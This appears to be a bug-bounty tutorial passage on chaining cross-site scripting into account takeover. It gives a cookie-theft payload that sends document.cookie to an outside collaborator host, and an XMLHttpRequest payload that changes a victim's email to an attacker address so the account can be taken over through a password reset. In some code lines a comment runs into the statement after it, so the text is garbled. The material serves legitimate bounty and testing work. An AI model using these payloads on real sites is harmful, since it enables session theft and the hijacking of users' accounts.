## Part 1: Chaining XSS to Hijack Account States
An alert(document.domain) pop-up only proves a vulnerability exists. To earn a critical-severity bounty payout, you must demonstrate real impact by writing an exploit payload that actively steals data or hijacks an account session.
## 1. The Session Cookie Theft Payload
If the target application does not protect its session cookies using the HttpOnly flag, an attacker can use XSS to read the cookies via JavaScript and exfiltrate them to an external server.

// Malicious payload injected into the vulnerable XSS vectornew Image().src = "https://your-collaborator-domain.com" + encodeURIComponent(document.cookie);


* How it works: The script creates a hidden image element in the background. It forces the victim's browser to send a GET request to your listener server, appending their private session tokens directly to the URL parameters.

## 2. The One-Click Account Takeover (CSRF via XSS)
If cookies are protected by HttpOnly, you cannot read them directly with JavaScript. However, because your malicious script runs directly inside the victim's authenticated browser session, you can force their browser to perform actions on their behalf, such as changing their registered email address.

// Malicious script hosted on your server or injected via the XSS vulnerabilityvar xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com", true);
xhr.setRequestHeader("Content-Type", "application/json");// The browser automatically attaches the victim's HttpOnly session cookies to this request
xhr.send(JSON.stringify({ "email": "attacker@evil-domain.com" }));


* The Impact: The next time a logged-in user clicks your vulnerable XSS link, their account email address is instantly changed to your email address. You can then trigger a password reset to lock them out and take over the account.

